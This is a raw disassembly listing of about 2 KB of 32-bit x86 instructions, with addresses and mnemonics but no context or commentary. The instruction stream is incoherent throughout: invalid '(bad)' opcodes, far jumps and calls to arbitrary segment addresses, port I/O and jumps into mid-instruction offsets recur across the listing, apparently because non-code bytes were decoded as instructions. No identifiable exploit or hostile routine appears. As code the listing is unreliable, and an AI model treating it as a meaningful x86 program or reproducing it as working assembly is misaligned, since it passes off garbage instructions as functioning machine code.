  417f72:	lds    ebp,FWORD PTR [ebx+esi*2-0x23]
  417f76:	xchg   ebp,eax
  417f77:	jnp    0x417fa6
  417f79:	inc    eax
  417f7a:	mov    ecx,0xb53af81d
  417f7f:	shl    DWORD PTR [edx+0x10],cl
  417f82:	sbb    al,0x87
  417f84:	push   ds
  417f85:	jnp    0x417ff1
  417f87:	adc    DWORD PTR [ebp+edi*4-0x5b331c37],edi
  417f8e:	jmp    0x87cf:0x4bb7a27f
  417f95:	xlat   BYTE PTR ds:[ebx]
  417f96:	mov    esp,0x3322fa14
  417f9b:	jg     0x417f5f
  417f9d:	sbb    al,0x89
  417f9f:	inc    ebx
  417fa0:	fcmovu st,st(3)
  417fa2:	(bad)  
  417fa3:	dec    ebx
  417fa4:	push   0x37
  417fa6:	sub    ah,BYTE PTR [ebx+ebp*4-0x6825721b]
  417fad:	cwde   
  417fae:	mov    dh,0xbc
  417fb0:	mov    dl,0xf1
  417fb2:	outs   dx,DWORD PTR ds:[esi]
  417fb3:	shl    BYTE PTR [ebx+0x673738aa],cl
  417fb9:	pushf  
  417fba:	pop    ebp
  417fbb:	mov    ch,0xc0
  417fbd:	sbb    eax,0x8ef4ec95
  417fc2:	jmp    0x418037
  417fc4:	ror    DWORD PTR [ebx-0x38],0x41
  417fc8:	mov    al,0x9f
  417fca:	dec    edx
  417fcb:	inc    ebx
  417fcc:	or     BYTE PTR [edx+0x3c85abfd],0x3e
  417fd3:	mov    eax,ds:0x43aef265
  417fd8:	cmp    eax,0xeba6c032
  417fdd:	ss add eax,0x7dbb85da
  417fe3:	arpl   WORD PTR [edx+0x5e],ax
  417fe6:	nop
  417fe7:	mov    ch,0xe6
  417fe9:	stos   DWORD PTR es:[edi],eax
  417fea:	ja     0x417f6f
  417fec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fed:	(bad)  
  417fee:	(bad)
  417ff2:	cmp    al,0x7b
  417ff4:	out    0x35,al
  417ff6:	imul   ebp,DWORD PTR [eax+ecx*2-0x64],0xffffffab
  417ffb:	jbe    0x417f8e
  417ffd:	in     eax,0x76
  417fff:	loope  0x417ff9
  418001:	jl     0x41800b
  418003:	repnz pop es
  418005:	iret   
  418006:	retf   0x3d28
  418009:	cmp    dl,0xc5
  41800c:	(bad)  [ecx-0x2b]
  41800f:	fst    DWORD PTR [ebp-0x4]
  418012:	xor    ch,dl
  418014:	mov    eax,0x551a7330
  418019:	xor    DWORD PTR ds:0xd8e9101f,ecx
  41801f:	outs   dx,DWORD PTR ds:[esi]
  418020:	clc    
  418021:	ja     0x41806a
  418023:	mov    eax,ds:0xa0e1c134
  418028:	test   DWORD PTR [edi],0xdeda1ea1
  41802e:	fs mov dh,0x58
  418031:	mov    edi,0xd797e2a0
  418036:	das    
  418037:	push   es
  418038:	and    eax,0xf577e518
  41803d:	in     eax,0x7b
  41803f:	bound  eax,QWORD PTR [esi-0x6]
  418042:	enter  0xbed3,0xce
  418046:	pop    ecx
  418047:	sbb    edx,0xb83a6924
  41804d:	sub    bh,BYTE PTR [esi]
  41804f:	inc    edx
  418050:	xlat   BYTE PTR ds:[ebx]
  418051:	fwait
  418052:	mov    ebx,0x5012bb80
  418057:	adc    DWORD PTR ds:0x31fa844c,ebx
  41805d:	push   ebp
  41805e:	jo     0x418095
  418060:	dec    esi
  418061:	sar    DWORD PTR [ecx+0x47],1
  418064:	dec    edx
  418065:	sub    BYTE PTR [edi-0x55],bh
  418068:	add    eax,0xbe95ed80
  41806d:	mov    bl,0x17
  41806f:	fadd   QWORD PTR [esi]
  418071:	ret    
  418072:	shl    BYTE PTR [esi-0x59],0xb
  418076:	xchg   esp,eax
  418077:	jle    0x41802f
  418079:	test   al,0x96
  41807b:	loopne 0x418094
  41807d:	adc    BYTE PTR [edi-0x525a5870],dh
  418083:	int3   
  418084:	xchg   bl,ch
  418086:	into   
  418087:	sar    edx,cl
  418089:	jno    0x41805f
  41808b:	retf   0xdcba
  41808e:	lock pop ecx
  418090:	test   eax,0xfd6ba1a9
  418095:	lahf   
  418096:	lods   eax,DWORD PTR ds:[esi]
  418097:	adc    al,0xc9
  418099:	sub    dh,BYTE PTR [eax-0x25aa9fc5]
  41809f:	jnp    0x4180ed
  4180a1:	mov    ecx,0xc4d3fe65
  4180a6:	cmp    ecx,DWORD PTR [edi+0x58962d3c]
  4180ac:	add    al,0x87
  4180ae:	fmul   st,st(7)
  4180b0:	and    DWORD PTR [esi+esi*4+0x46],ebx
  4180b4:	in     eax,0x69
  4180b6:	xchg   esp,eax
  4180b7:	xchg   esp,eax
  4180b8:	xor    ebx,DWORD PTR [eax-0x33]
  4180bb:	xor    ah,BYTE PTR [esi-0x1ceabadc]
  4180c1:	or     DWORD PTR [ebx],ebp
  4180c3:	adc    DWORD PTR [ebx+ebx*1+0x3cb3b413],ebx
  4180ca:	bound  esp,QWORD PTR [ecx+ebx*4]
  4180cd:	adc    bl,bh
  4180cf:	inc    BYTE PTR [edx]
  4180d1:	repnz cmp al,0x5d
  4180d4:	nop
  4180d5:	pusha  
  4180d6:	psllq  mm5,QWORD PTR [ecx]
  4180d9:	fs pop esi
  4180db:	test   al,0xed
  4180dd:	inc    ecx
  4180de:	(bad)  
  4180df:	sub    ecx,ecx
  4180e1:	dec    eax
  4180e2:	mov    ds:0x67ee4de9,eax
  4180e7:	out    0xe9,al
  4180e9:	sub    BYTE PTR [eax-0x141c5ba0],0x82
  4180f0:	cmp    DWORD PTR [eax],0xffffff96
  4180f3:	and    eax,0xc977d3e3
  4180f8:	and    al,0xca
  4180fa:	imul   esp,DWORD PTR [esi-0x51339f7b],0x6cfa65b2
  418104:	je     0x418120
  418106:	push   ebx
  418107:	stc    
  418108:	xor    edx,esi
  41810a:	mov    ds:0xe5678bd5,al
  41810f:	inc    ebx
  418110:	dec    esp
  418111:	inc    esi
  418112:	mov    al,0x77
  418114:	mov    al,ds:0x7e28f263
  418119:	xor    ecx,DWORD PTR [edi+edx*1+0x3e562200]
  418120:	mov    DWORD PTR [eax-0x761289ad],eax
  418126:	dec    ecx
  418127:	jp     0x418184
  418129:	retf   
  41812a:	fcomp  DWORD PTR [ebx]
  41812c:	stc    
  41812d:	(bad)  
  41812e:	and    BYTE PTR [ebp+0x2d],dl
  418131:	jl     0x41810d
  418133:	int3   
  418134:	sti    
  418135:	inc    esi
  418136:	add    ebp,DWORD PTR [ebx+0x27]
  418139:	pop    ds
  41813a:	popf   
  41813b:	mov    esi,0x96931f44
  418140:	push   edi
  418141:	adc    esi,DWORD PTR [ecx+0x639fb6f9]
  418147:	cmp    ebp,DWORD PTR [esi]
  418149:	aas    
  41814a:	xor    al,0x63
  41814c:	sub    bl,BYTE PTR [esi+0x5bede0d2]
  418152:	scas   al,BYTE PTR es:[edi]
  418153:	ror    dl,0xf0
  418156:	jmp    0x55fc4fc7
  41815b:	int    0x6a
  41815d:	xor    DWORD PTR [edi],0x9552e7ee
  418163:	inc    esi
  418164:	or     ch,al
  418166:	inc    esi
  418167:	stos   BYTE PTR es:[edi],al
  418168:	xor    DWORD PTR [ecx-0x74],0xab03fe4f
  41816f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418170:	repnz fsub QWORD PTR [edi+0x64]
  418174:	fldcw  WORD PTR [edx-0x60]
  418177:	jg     0x418187
  418179:	mov    edi,eax
  41817b:	sub    eax,0xad944910
  418180:	pop    ebp
  418181:	fst    QWORD PTR [edx]
  418184:	fisttp WORD PTR [ebx]
  418186:	fstp   DWORD PTR [eax+0x5e1cc566]
  41818c:	xor    eax,0x2dd4728
  418191:	mov    esi,0x86a012ea
  418196:	push   ss
  418197:	jecxz  0x418199
  418199:	mov    ah,0x64
  41819b:	mov    ah,0x27
  41819d:	add    eax,0xebf539c1
  4181a2:	cmp    bh,BYTE PTR [ecx+0xa]
  4181a5:	psubsb mm7,QWORD PTR [ecx+eiz*4]
  4181a9:	fs jecxz 0x41813e
  4181ac:	xchg   ecx,eax
  4181ad:	outs   dx,BYTE PTR ds:[esi]
  4181ae:	sbb    al,0x78
  4181b0:	ror    BYTE PTR [esi-0x62],cl
  4181b3:	sub    eax,0xc97a2156
  4181b8:	mov    edi,0x86c399a4
  4181bd:	cmp    eax,0x429c0e3f
  4181c2:	xor    DWORD PTR [ebx],edi
  4181c4:	call   0xa141:0x43c3faff
  4181cb:	mov    eax,ds:0x703b02a0
  4181d0:	fnstsw WORD PTR [eax+ebx*4-0x1ce0bf0a]
  4181d7:	inc    esp
  4181d8:	add    bh,cl
  4181da:	pop    ebx
  4181db:	sahf   
  4181dc:	xor    BYTE PTR [esi+eiz*2],0xf8
  4181e0:	xchg   esp,eax
  4181e1:	ja     0x4181f4
  4181e3:	cld    
  4181e4:	mov    bh,0xa0
  4181e6:	stos   BYTE PTR es:[edi],al
  4181e7:	xchg   esi,eax
  4181e8:	jle    0x418182
  4181ea:	jge    0x418264
  4181ec:	sub    al,bl
  4181ee:	out    0x12,eax
  4181f0:	xor    eax,0x57f58a71
  4181f5:	and    DWORD PTR [ecx-0x7],esi
  4181f8:	push   edx
  4181fa:	sub    al,0x91
  4181fc:	push   edi
  4181fd:	(bad)  
  4181fe:	mov    edi,0xaf419191
  418203:	xchg   esi,eax
  418204:	stc    
  418205:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418206:	mov    dl,0xcf
  418208:	cwde   
  418209:	jmp    0x418267
  41820b:	jbe    0x418226
  41820d:	jmp    0x4181ee
  41820f:	retf   
  418210:	adc    eax,0x4e20dc81
  418215:	cdq    
  418216:	xchg   esi,eax
  418217:	jle    0x418272
  418219:	mov    esp,0xd2c054e5
  41821e:	mov    edx,0x913846f4
  418223:	mov    ah,0x44
  418225:	fcomp  st(1)
  418227:	aam    0x70
  418229:	xchg   esp,eax
  41822a:	mov    DWORD PTR [ebx-0x36],eax
  41822d:	sahf   
  41822e:	jmp    0x95d1341e
  418233:	mov    BYTE PTR [ebp+eax*4+0x5a],cl
  418237:	xchg   DWORD PTR [eax+ecx*4],edx
  41823a:	jmp    0x418287
  41823c:	push   ecx
  41823d:	icebp  
  41823e:	je     0x418221
  418240:	mov    BYTE PTR [edx+0x12],0x99
  418244:	jmp    0x418204
  418246:	fsubp  st(7),st
  418248:	neg    dl
  41824a:	scas   eax,DWORD PTR es:[edi]
  41824b:	push   ecx
  41824c:	retf   
  41824d:	outs   dx,DWORD PTR ds:[esi]
  41824e:	adc    bh,BYTE PTR [edx]
  418250:	xor    BYTE PTR [esi],0xd8
  418253:	into   
  418254:	xchg   ebx,eax
  418255:	sub    esp,DWORD PTR [esi]
  418257:	into   
  418258:	pop    eax
  418259:	add    DWORD PTR [edi],ebp
  41825b:	lock jmp 0x989d:0xce084e02
  418263:	dec    eax
  418264:	adc    eax,0x7679653c
  418269:	stos   BYTE PTR es:[edi],al
  41826a:	or     al,0xd
  41826c:	imul   ecx,DWORD PTR [edi-0x379d3298],0xd510f84
  418276:	push   ds
  418277:	sub    al,BYTE PTR [edi+eax*2+0x352383d7]
  41827e:	pop    ss
  41827f:	test   eax,0x52b200d7
  418284:	and    eax,DWORD PTR [ecx]
  418286:	and    eax,0xe9d247d0
  41828b:	(bad)  
  41828c:	out    dx,al
  41828d:	sbb    esi,DWORD PTR [eax+0x36]
  418290:	sub    ecx,esi
  418292:	xlat   BYTE PTR ds:[ebx]
  418293:	cmp    eax,0x794e5c13
  418298:	sub    al,0xf4
  41829a:	les    ecx,FWORD PTR [esp+esi*1]
  41829d:	jnp    0x418246
  41829f:	jo     0x418267
  4182a1:	add    DWORD PTR [esi-0x4e],esi
  4182a4:	iret   
  4182a5:	and    eax,0x89fa4164
  4182aa:	cmp    al,0x43
  4182ac:	push   esi
  4182ad:	leave  
  4182ae:	sbb    eax,0x48286981
  4182b3:	sbb    DWORD PTR [eax],ecx
  4182b5:	cmp    DWORD PTR [ebp-0x3f],ebx
  4182b8:	pop    ds
  4182b9:	sbb    eax,DWORD PTR [esi-0x42afdc93]
  4182bf:	rep movs DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4182c2:	sar    DWORD PTR [ebx+ebx*4+0x82ccc94],0x78
  4182ca:	jl     0x418279
  4182cc:	cmp    dh,dl
  4182ce:	fiadd  DWORD PTR [edi-0x70a8e71d]
  4182d4:	sbb    DWORD PTR [ecx-0x62e35e66],ecx
  4182da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182db:	adc    ecx,ebx
  4182dd:	mov    bl,0x2c
  4182df:	cmp    eax,0xcb58d441
  4182e4:	lahf   
  4182e5:	(bad)
  4182e9:	nop
  4182ea:	mov    ds:0xda86107b,al
  4182ef:	fadd   QWORD PTR [edx]
  4182f1:	mov    eax,0x90b38089
  4182f6:	shl    DWORD PTR [esi+0x5f],cl
  4182f9:	xor    ebx,DWORD PTR [di]
  4182fc:	out    dx,eax
  4182fd:	mov    edi,0x41bcc078
  418302:	adc    al,0xbd
  418304:	pop    edi
  418305:	mov    ch,BYTE PTR [edi]
  418307:	mov    ch,0xba
  418309:	dec    ebx
  41830a:	sub    dh,bl
  41830c:	inc    eax
  41830d:	pop    es
  41830e:	push   esp
  41830f:	mov    edx,0x598eb7d6
  418314:	sub    al,0x4e
  418316:	rcr    DWORD PTR [edi-0x5f58d955],1
  41831c:	dec    edx
  41831d:	xchg   BYTE PTR [ebx+0x21c91ae5],dh
  418323:	mov    bh,0x58
  418325:	in     eax,0xb5
  418327:	daa    
  418328:	sub    eax,0x46c050e6
  41832d:	adc    BYTE PTR [eax-0x44f3ba7a],al
  418333:	int    0x35
  418335:	int    0xca
  418337:	mov    edx,0x294ac9ca
  41833c:	mov    ah,0xa7
  41833e:	ret    0xfec
  418341:	loopne 0x41832b
  418343:	aam    0x5f
  418345:	inc    ebp
  418346:	sbb    al,0xfa
  418348:	xchg   edi,eax
  418349:	and    eax,0x4d495ff9
  41834e:	repnz outs dx,BYTE PTR ds:[esi]
  418350:	pop    esi
  418351:	mov    ebx,0x699a2281
  418356:	cmp    al,0xb5
  418358:	or     eax,0xe92fadac
  41835d:	add    al,0x79
  41835f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418360:	leave  
  418361:	sub    cl,BYTE PTR [ecx]
  418363:	and    eax,0xe2e4ced2
  418368:	fistp  QWORD PTR ss:[edx]
  41836b:	gs push ecx
  41836d:	pause  
  41836f:	std    
  418370:	dec    esp
  418371:	cwde   
  418372:	aad    0x44
  418374:	jmp    0x3a97:0x844864e4
  41837b:	inc    ebx
  41837c:	gs icebp 
  41837e:	push   es
  41837f:	lahf   
  418380:	or     ah,al
  418382:	xlat   BYTE PTR ds:[ebx]
  418383:	jl     0x418387
  418385:	out    0xa2,eax
  418387:	fyl2x  
  418389:	pop    esi
  41838a:	mov    al,0x53
  41838c:	jecxz  0x418375
  41838e:	pop    esi
  41838f:	mov    eax,ds:0x812bdf35
  418394:	out    dx,al
  418395:	and    esp,DWORD PTR ds:0x483b069e
  41839b:	rcl    BYTE PTR [ebp+esi*2+0x68db52b],0xb2
  4183a3:	ja     0x4183f8
  4183a5:	scas   eax,DWORD PTR es:[edi]
  4183a6:	test   DWORD PTR [ebx],edx
  4183a8:	popf   
  4183a9:	sub    ch,bl
  4183ab:	in     eax,0xcd
  4183ad:	(bad)  
  4183ae:	es sahf 
  4183b0:	ins    DWORD PTR es:[edi],dx
  4183b1:	dec    ebp
  4183b2:	push   ebp
  4183b3:	lgs    ebx,FWORD PTR [eax]
  4183b6:	and    esp,DWORD PTR [esi]
  4183b8:	outs   dx,BYTE PTR ds:[esi]
  4183b9:	jecxz  0x4183d0
  4183bb:	and    DWORD PTR [esi],esi
  4183bd:	or     bl,BYTE PTR [ecx]
  4183bf:	scas   al,BYTE PTR es:[edi]
  4183c0:	pop    edx
  4183c1:	fdivr  DWORD PTR [edi]
  4183c3:	loope  0x41834b
  4183c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183c6:	dec    ebp
  4183c7:	jne    0x4183eb
  4183c9:	stos   DWORD PTR es:[edi],eax
  4183ca:	maskmovq mm6,mm1
  4183cd:	in     al,dx
  4183ce:	lods   al,BYTE PTR ds:[esi]
  4183cf:	(bad)
  4183d2:	test   DWORD PTR [ebp+0x2e6349b8],esp
  4183d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183d9:	out    dx,eax
  4183da:	(bad)  
  4183db:	les    edx,FWORD PTR ds:0x705a412d
  4183e1:	adc    al,0x28
  4183e3:	loop   0x418456
  4183e5:	sub    DWORD PTR [eax+0x14],esi
  4183e8:	mov    edi,0x79fb603d
  4183ed:	shr    ebx,0x24
  4183f0:	push   es
  4183f1:	inc    ebp
  4183f2:	jnp    0x418394
  4183f4:	mov    dh,0x5f
  4183f6:	test   DWORD PTR [esi-0x4b6bd318],esi
  4183fc:	mov    WORD PTR [edi-0x10187cab],?
  418402:	jmp    0xad32:0x5dfca9b7
  418409:	jmp    0xa64d:0x1299
  41840f:	push   ebx
  418410:	(bad)
  418414:	sbb    cl,ah
  418416:	gs sar dl,1
  418419:	sbb    BYTE PTR [eax+0x34a9da7c],ch
  41841f:	cmp    ch,ah
  418421:	fiadd  DWORD PTR [edi-0x19a19e55]
  418427:	inc    ecx
  418428:	aad    0x1c
  41842a:	fdiv   QWORD PTR [eax+0x6]
  41842d:	or     dh,dh
  41842f:	xchg   ecx,eax
  418430:	jp     0x4183e8
  418432:	das    
  418433:	fsubr  QWORD PTR [eax-0x2e]
  418436:	push   ebx
  418437:	or     BYTE PTR [ebx-0x58],ch
  41843a:	imul   esi,edx,0x16f56efc
  418440:	jno    0x41843c
  418442:	and    eax,0xa5285f64
  418447:	mov    edx,esp
  418449:	loope  0x4183ef
  41844b:	mov    dl,0x77
  41844d:	(bad)  
  41844e:	xchg   ebx,eax
  41844f:	xor    al,0xf2
  418451:	add    ebp,DWORD PTR [ecx+0x22]
  418454:	dec    eax
  418455:	leave  
  418456:	sbb    DWORD PTR [ecx-0xcc4bf0f],eax
  41845c:	mov    eax,0x341945e1
  418461:	and    dh,BYTE PTR [eax+0x344e441]
  418467:	jmp    0xbcb2:0x34c6b555
  41846e:	hlt    
  41846f:	jb     0x418461
  418471:	push   es
  418472:	push   cs
  418473:	sbb    edx,DWORD PTR [esi+0x1f6304c4]
  418479:	fild   QWORD PTR [ecx-0x1ab64c2a]
  41847f:	push   ss
  418480:	mov    DWORD PTR [ebx+0x44310afe],esp
  418486:	in     eax,dx
  418487:	lds    esp,FWORD PTR [esi-0x2e]
  41848a:	test   BYTE PTR [edi],0x79
  41848d:	aas    
  41848e:	or     ecx,DWORD PTR [esi-0x6d5a0b0e]
  418494:	leave  
  418495:	call   0xda4e:0xbd4f9398
  41849c:	and    bl,BYTE PTR [esi]
  41849e:	mov    cl,0xa6
  4184a0:	sbb    al,0x39
  4184a2:	push   es
  4184a3:	outs   dx,DWORD PTR ds:[esi]
  4184a4:	mov    esi,0xbdaa1055
  4184a9:	fs pop edx
  4184ab:	pop    edx
  4184ac:	jns    0x41850b
  4184ae:	mov    cl,0xfd
  4184b0:	cwde   
  4184b1:	hlt    
  4184b2:	push   edi
  4184b3:	mov    esi,DWORD PTR [eax]
  4184b5:	sub    al,BYTE PTR cs:[esi+0x732665c3]
  4184bc:	iret   
  4184bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184be:	jbe    0x4184fb
  4184c0:	repz out 0x62,al
  4184c3:	mov    eax,0xbf8ac39f
  4184c8:	xchg   ebp,eax
  4184c9:	push   es
  4184ca:	add    ebx,edi
  4184cc:	shl    dl,1
  4184ce:	cdq    
  4184cf:	push   edi
  4184d0:	xchg   ecx,eax
  4184d1:	pop    esp
  4184d2:	loop   0x4184cc
  4184d4:	mov    ebp,0x637dbb4c
  4184d9:	jbe    0x418468
  4184db:	push   ds
  4184dc:	pop    eax
  4184dd:	inc    edx
  4184de:	pop    esp
  4184df:	int3   
  4184e0:	cmp    ch,BYTE PTR [edx+0x774477d1]
  4184e6:	xor    eax,0x6bf22753
  4184eb:	stc    
  4184ec:	jae    0x418479
  4184ee:	xchg   ebp,eax
  4184ef:	mov    edx,ecx
  4184f1:	outs   dx,DWORD PTR ds:[esi]
  4184f2:	mov    cl,0xda
  4184f4:	push   ss
  4184f5:	call   0x2b73:0x4c8b8d73
  4184fc:	jl     0x4184d8
  4184fe:	sub    eax,0xccfdc996
  418503:	addr16 cdq 
  418505:	xchg   bl,dl
  418507:	jno    0x418572
  418509:	aaa    
  41850a:	jnp    0x418541
  41850c:	and    eax,0xb55264b1
  418511:	mov    bh,0x8b
  418513:	lock cmc 
  418515:	cmp    al,0x46
  418517:	mov    al,ds:0x88d8c4ff
  41851c:	jecxz  0x41851d
  41851e:	push   0xd93bd084
  418523:	jl     0x4184ab
  418525:	or     al,0x14
  418527:	xor    eax,0xea324295
  41852c:	add    ch,dh
  41852e:	and    DWORD PTR [eax],edi
  418530:	and    dl,BYTE PTR ds:0x43987889
  418536:	imul   esp,DWORD PTR [ebp+0x56],0xb84cb708
  41853d:	inc    edi
  41853e:	dec    eax
  41853f:	fwait
  418540:	ss call 0x2ed3:0xe8086cd7
  418548:	add    esi,DWORD PTR [edx-0x2daf66c]
  41854e:	repnz dec eax
  418550:	sub    al,0x48
  418552:	pusha  
  418553:	push   eax
  418554:	ret    0x6e86
  418557:	jmp    DWORD PTR [eax-0xc2f0b13]
  41855d:	arpl   WORD PTR [eax+0x536296a8],ax
  418563:	and    eax,0x40e02b0f
  418568:	fbstp  TBYTE PTR [ebp-0x37bf8e58]
  41856e:	loopne 0x41856f
  418570:	mov    eax,ds:0xffa98b40
  418575:	loopne 0x4185c3
  418577:	(bad)  
  418578:	(bad)  
  418579:	xchg   esp,ecx
  41857b:	out    0xf4,al
  41857d:	jbe    0x41855c
  41857f:	retf   
  418580:	jmp    0x418536
  418582:	push   ebp
  418583:	repnz (bad) 
  418586:	xchg   ebp,eax
  418587:	div    BYTE PTR [ebx+0x7f]
  41858a:	dec    ebp
  41858b:	lods   eax,DWORD PTR ds:[esi]
  41858c:	arpl   WORD PTR [ebp+0x1f2c83f2],dx
  418592:	outs   dx,BYTE PTR ds:[esi]
  418593:	sbb    eax,0x9cc7b70f
  418598:	push   eax
  418599:	popa   
  41859a:	sar    BYTE PTR [ebp+0x16],0x9e
  41859e:	aad    0xed
  4185a0:	loop   0x4185d1
  4185a2:	pop    es
  4185a3:	mov    ecx,0x69a5aaf2
  4185a8:	mov    esp,0xb7e92fff
  4185ad:	pop    ss
  4185ae:	add    eax,0x88b99b1c
  4185b3:	fstp   TBYTE PTR [ebx+ecx*8]
  4185b6:	es xchg esi,eax
  4185b8:	repnz test al,0x91
  4185bb:	xor    ecx,DWORD PTR [esi-0x467e9534]
  4185c1:	mov    ebp,0x1a897c40
  4185c6:	mov    esp,0x2a92c51d
  4185cb:	lahf   
  4185cc:	jo     0x418628
  4185ce:	jmp    0x4185ff
  4185d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185d1:	jne    0x4185cf
  4185d3:	ds jmp 0x4185f1
  4185d6:	push   0xffffffa9
  4185d8:	mov    al,0xd8
  4185da:	sub    DWORD PTR fs:[eax-0x113c5179],0x19
  4185e2:	call   0x36c6:0xcd7240f3
  4185e9:	mov    ebx,0x79c57f39
  4185ee:	ja     0x418593
  4185f0:	adc    eax,0x45cc01d2
  4185f5:	scas   al,BYTE PTR es:[edi]
  4185f6:	ds cmp al,0xf3
  4185f9:	(bad)  
  4185fa:	jmp    0x418598
  4185fc:	jg     0x418675
  4185fe:	push   ebp
  4185ff:	mov    WORD PTR [esi-0x2f],ds
  418602:	pop    ebp
  418603:	dec    edi
  418604:	sbb    eax,0x34781b27
  418609:	cmp    ecx,edi
  41860b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41860c:	sbb    dl,ah
  41860e:	sub    DWORD PTR [edi-0x4342dcfd],0x4a189dac
  418618:	jnp    0x418663
  41861a:	loopne 0x418615
  41861c:	add    eax,0xaaa7fff2
  418621:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418622:	mov    edi,fs
  418624:	call   0xd2ea:0xe2c310fb
  41862b:	jmp    0x53f0eeba
  418630:	mov    ebp,0x6d76442d
  418635:	cld    
  418636:	dec    eax
  418637:	and    BYTE PTR [edi+ebp*1],0xfe
  41863b:	shl    BYTE PTR [ecx+0x33],cl
  41863e:	push   es
  41863f:	je     0x418685
  418641:	ret    0x3149
  418644:	ror    cl,0x56
  418647:	neg    BYTE PTR ds:0x1f7c44cc
  41864d:	adc    BYTE PTR [ebx+0x4e],al
  418650:	pop    esp
  418651:	lahf   
  418652:	jle    0x4185dc
  418654:	mov    ds:0xc6c380b2,eax
  418659:	or     al,0x38
  41865b:	xchg   ecx,eax
  41865c:	mov    ebx,0x30f1abe3
  418661:	jno    0x418697
  418663:	enter  0x8d50,0x7c
  418667:	sbb    al,0x24
  418669:	push   0x5bb280b8
  41866e:	xchg   ebx,eax
  41866f:	jo     0x418699
  418671:	sub    esi,ecx
  418673:	fisttp DWORD PTR [edx]
  418675:	shr    DWORD PTR [esi-0x2ab91293],cl
  41867b:	push   ebx
  41867c:	jno    0x4186ad
  41867e:	mov    ds:0xe06f1216,eax
  418683:	pop    edx
  418684:	std    
  418685:	or     eax,0x966b0a9d
  41868a:	sti    
  41868b:	xchg   ebp,eax
  41868c:	push   es
  41868d:	call   0x18e1:0x13c9d561
  418694:	xor    BYTE PTR [esi+0x44],al
  418697:	daa    
  418698:	mov    edi,eax
  41869a:	sub    BYTE PTR [ebp+0x70],cl
  41869d:	(bad)  
  41869e:	sub    al,dl
  4186a0:	inc    edi
  4186a1:	or     DWORD PTR [ebx],ebx
  4186a3:	sub    eax,DWORD PTR ds:0x2da32bbe
  4186a9:	(bad)  
  4186ac:	test   BYTE PTR [ebp+0x7f],dl
  4186af:	(bad)  [esi]
  4186b1:	inc    ecx
  4186b2:	inc    esp
  4186b3:	jbe    0x418640
  4186b5:	adc    eax,0x73f7c296
  4186ba:	cld    
  4186bb:	dec    DWORD PTR [edx]
  4186bd:	add    eax,0xdd71433e
  4186c2:	push   edx
  4186c3:	mov    ?,WORD PTR [ebp-0x37925b7a]
  4186c9:	mov    ah,0x5c
  4186cb:	pop    ecx
  4186cc:	add    al,0xc8
  4186ce:	mov    ah,0xdd
  4186d0:	in     eax,0xcc
  4186d2:	mov    ebx,DWORD PTR [ecx+0x4d]
  4186d5:	shl    DWORD PTR [ebx+0x6e2d3060],1
  4186db:	push   ss
  4186dc:	and    BYTE PTR [ebx+0x446ec237],0xed
  4186e3:	cmc    
  4186e4:	ja     0x4186b4
  4186e6:	jo     0x418709
  4186e8:	sahf   
  4186e9:	test   DWORD PTR [ecx+0x72e1ff25],ecx
  4186ef:	mov    eax,ds:0x3b0a8902
  4186f4:	mov    esi,ecx
  4186f6:	(bad)  
  4186f7:	jns    0x418750
  4186f9:	jnp    0x4186f2
  4186fb:	pop    es
  4186fc:	dec    ecx
  4186fd:	outs   dx,DWORD PTR ds:[esi]
  4186fe:	adc    BYTE PTR [edx-0x7d33aa39],cl
  418704:	pop    ds
  418705:	(bad)  
  418706:	loop   0x4186e3
  418708:	xor    dh,dl
  41870a:	pop    ds
  41870b:	(bad)  
  41870c:	hlt    
  41870d:	loop   0x4186a9
  41870f:	cmp    al,0xb8
  418711:	xor    edi,ecx
  418713:	out    dx,eax
  418714:	adc    al,0xfb
  418716:	into   
  418717:	push   edi
  418718:	inc    cx
  41871a:	mov    DWORD PTR ds:0x31f8249a,eax
  418720:	dec    ebp
  418721:	sub    cl,BYTE PTR [ebx+0x398e69c0]
  418727:	mov    dh,0x9f
  418729:	(bad)  
  41872a:	out    dx,eax
  41872b:	(bad)  
  41872c:	in     eax,0x4e
  41872e:	dec    ebx
  41872f:	inc    edx
  418730:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418731:	fstp   TBYTE PTR [ecx+0x1d729ad9]
  418737:	test   BYTE PTR [edi-0xedc3536],ah
  41873d:	setg   BYTE PTR [ebp-0x11]
  418741:	mov    al,0xd0
  418743:	xchg   esp,eax
  418744:	inc    eax
  418745:	in     al,dx
  418746:	aam    0x2
  418748:	popa   
  418749:	push   ecx
  41874a:	lods   al,BYTE PTR ds:[esi]
  41874b:	xchg   esp,eax
  41874c:	and    DWORD PTR [ebp+0x2d9af1fb],esi
  418752:	and    al,0xf7
  418754:	fwait
  418755:	add    DWORD PTR [ecx],0x26544a36
  41875b:	ins    DWORD PTR es:[edi],dx
  41875c:	inc    eax
  41875d:	aaa    
  41875e:	push   ss
  41875f:	pop    esi
  418760:	repnz dec edi
  418762:	or     BYTE PTR [eax],0xbd
  418765:	or     dh,dh
  418767:	dec    ecx
  418768:	sbb    eax,0x672f36e6
  41876d:	call   0x61e4:0x6d6b4f95
  418774:	adc    DWORD PTR [ebx-0x4c],0xa9497ab6
  41877b:	mov    ch,0xe4
  41877d:	and    eax,0x8ea5c6b2
  418782:	push   edx
  418783:	pop    eax
  418784:	push   0xb56e5f0e
  418789:	jge    0x4187ee
  41878b:	mov    ah,0x7b
  41878d:	mov    ebp,ecx
  41878f:	mov    al,0x38
  418791:	and    BYTE PTR [edi+0x6b4f8db9],ah
  418797:	xor    eax,0x7aca9c70
  41879c:	jae    0x418758
  41879e:	sub    BYTE PTR [edx+ebx*1],al
  4187a1:	bound  ebx,QWORD PTR [esi-0x54]
  4187a4:	lods   eax,DWORD PTR ds:[esi]
  4187a5:	jne    0x4187f3
  4187a7:	inc    ebx
  4187a8:	lods   al,BYTE PTR ds:[esi]
  4187a9:	retf   0x7cf
  4187ac:	add    al,bl
  4187ae:	cs mov al,0x28
